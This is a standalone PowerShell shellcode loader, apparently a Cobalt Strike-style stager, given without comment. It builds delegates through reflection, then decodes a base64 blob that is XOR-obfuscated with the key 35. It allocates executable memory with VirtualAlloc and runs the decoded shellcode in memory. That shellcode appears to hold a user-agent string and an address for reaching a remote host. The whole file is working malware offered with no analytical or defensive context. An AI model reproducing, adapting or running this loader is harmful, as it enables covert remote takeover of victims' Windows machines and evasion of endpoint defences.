Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim3MjIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDGdaShQj4c1PLk9goltr0MkhuhIBzX/7kttN1kL8VzZJulZuz0vBIOfObtTzwgA8U9fu80fmBOVZa72b10NBdDeTEaxejOQKXBEfBa3gtiN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMSEw0TGAN0Sk1HTFRQA213AxUNERgDdGx0FRcYA3dRSkdGTVcMFQ0TGANicHYRaXAKLikj+xfrwb53MqLPrya1VzWJ8n5Dc6MXVg0pgn5EToM8dRpUNEMITOvXl1G62FQ2Xoq7PaZXnYeqXOJGD5ofkYiOnJiJfu0i2qhehGt1cLsTzGwaEtLz5m7P34dMJHabCxwgshXvo6SDFPbXiHKuuPCSk54Tj/ulMm6U6EpH0DujEJaLjnKlvbmLzfI6rZfR6V3sDfkxe5WqnALO4qW++cRUHBL/TMGfXLzStX31y6M9J1RZrFSDXKB3AE1cRqdcegqqjK80SAv0JAUxYI+qqXiREO4jYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BIbFg0RExYNEhENEhMVIzpKg64=')

	for ($x = 0; $x -lt $var_code.Count; $x++) {
		$var_code[$x] = $var_code[$x] -bxor 35
	}

	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
	$var_runme.Invoke([IntPtr]::Zero)
}
